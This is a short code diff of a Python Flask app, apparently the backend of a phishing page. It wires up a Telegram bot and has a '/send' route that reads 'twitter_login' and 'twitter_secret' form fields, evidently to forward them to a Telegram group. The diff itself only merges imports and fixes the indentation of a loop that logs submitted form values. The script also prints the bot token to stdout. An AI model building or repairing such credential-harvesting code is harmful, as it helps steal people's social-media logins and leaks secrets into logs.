@@ -1,8 +1,7 @@
 import os
 import base64
 from io import BytesIO
-from flask import Flask, request, jsonify
-from flask import render_template
+from flask import Flask, request, jsonify, render_template
 import telegram
 
 TOKEN = os.getenv("BOT_TOKEN")
@@ -14,6 +13,7 @@ if not TOKEN or not GROUP_ID:
 bot = telegram.Bot(token=TOKEN)
 print("🟡 BOT_TOKEN:", TOKEN)
 print("🟡 GROUP_ID:", GROUP_ID)
+
 app = Flask(__name__)
 
 
@@ -25,9 +25,9 @@ def index():
 @app.route('/send', methods=['POST'])
 def send_to_telegram():
     print("✅ POST /send called")
-print("📝 Form data received:")
-for key, value in request.form.items():
-    print(f"  {key}: {value[:50]}")  # ограничим вывод до 50 символов
+    print("📝 Form data received:")
+    for key, value in request.form.items():
+        print(f"  {key}: {value[:50]}")  # ограничим вывод до 50 символов
 
     twitter_login = request.form.get("twitter_login", "")
     twitter_secret = request.form.get("twitter_secret", "")
